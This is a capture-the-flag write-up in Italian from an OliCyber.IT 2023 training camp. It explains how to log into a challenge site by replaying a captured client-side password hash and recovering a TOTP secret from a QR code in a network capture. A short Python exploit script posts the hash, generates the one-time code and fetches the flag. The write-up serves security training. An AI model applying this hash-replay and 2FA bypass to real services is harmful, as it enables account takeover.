# OliCyber.IT 2023 - Simulazione training camp 1

## [network] Secure Co. Login (8 risoluzioni)

La challenge mette a disposizione un sito web in cui bisogna riuscire a fare il login, e una cattura di rete del processo di login in corso.

### Soluzione

La prima "sicurezza" del sito è l'hash della password client-side anzichè server-side. Per bypassarla basta evitare di usare il frontend e mandare direttamente l'hash.

Il sito web tuttavia implementa una two-factor authentication usando un codice OTP.

Il secret però viene mandato all'utente quando fa il login sottoforma di codice QR (interpretabile dall'app Google authenticator per esempio).

Analizzando quindi il pcap si può estrarre il codice QR dall'ultima richiesta, visualizzarlo, e generare un codice OTP valido.

### Exploit

```python
import os
import requests
import logging
import pyotp
logging.disable()

URL = os.environ.get("URL", "http://securelogin.challs.olicyber.it/")

s = requests.Session()

s.post(URL+"/login", json={"username":"admin", "password":"5d08a95e13ee227fb04dfb425bcc690176a9680e1bc8192b7d55db57f3d9a38b"})
totp = pyotp.TOTP('MNRWGNLUOJWDOZD2')
code=totp.now()
s.get(URL+"/2fa", params={"code":code})

flag = s.get(URL+"/user-info").json()["flag"]

print(flag)

```
